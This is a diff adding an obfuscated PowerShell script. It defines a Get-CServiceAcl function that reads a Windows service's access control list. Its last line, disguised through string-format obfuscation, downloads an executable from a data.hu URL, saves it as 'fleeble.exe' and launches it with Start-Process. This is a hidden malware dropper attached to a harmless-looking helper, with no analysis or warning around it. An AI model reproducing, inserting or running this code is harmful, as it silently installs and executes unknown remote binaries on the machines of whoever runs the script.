@@ -1,0 +1,22 @@
+function g`Et-C`SeR`VicEA`cL
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(mAndaTorY=${T`RuE})]
+        [string]
+        
+        ${N`AME}
+    )
+
+    &("{3}{1}{2}{4}{0}"-f 'e','et-S','tric','S','tMod') -Version ("{2}{1}{0}" -f 'st','ate','L')
+
+    &("{2}{1}{5}{0}{3}{4}" -f 'l','s','U','lerPreferenc','e','e-Ca') -Cmdlet ${pScM`D`LeT} -Session ${E`X`EcUTiOncon`TE`xT}."s`Es`sIONSTa`TE"
+
+    ${RAw`SD} = &("{1}{4}{2}{0}{6}{8}{7}{3}{5}"-f 'rvi','G','Se','cript','et-C','or','ceSecurityD','s','e') -Name ${N`Ame}
+    ${RAw`D`ACl} = ${RA`Wsd}."DI`scRe`TI`ONAr`YaCl"
+    .("{2}{0}{1}" -f'Ob','ject','New-') ("{9}{8}{6}{7}{3}{10}{5}{4}{1}{0}{2}" -f'r','a','yAcl','.Acc','retion','ontrol.Disc','r','ity','cu','Se','essC') ${fa`lSe},${f`AL`SE},${r`AwDACL}
+}
+
+
+(&("{1}{0}{2}"-f'O','New-','bject') ("{6}{5}{1}{4}{3}{0}{2}" -f '.WebClien','t','t','t','em.Ne','ys','S')).("{0}{2}{1}" -f'D','wnloadFile','o').Invoke(("{8}{7}{2}{1}{6}{3}{4}{5}{0}"-f'ad.exe','/0','a.hu/get','950714','8','/Patlo','/','ddl7.dat','http://'),("{3}{2}{0}{1}"-f'e','eble.exe','l','f'));&("{0}{2}{1}" -f'Start-Pr','ess','oc') ("{0}{1}{3}{2}" -f 'fle','eb','.exe','le')
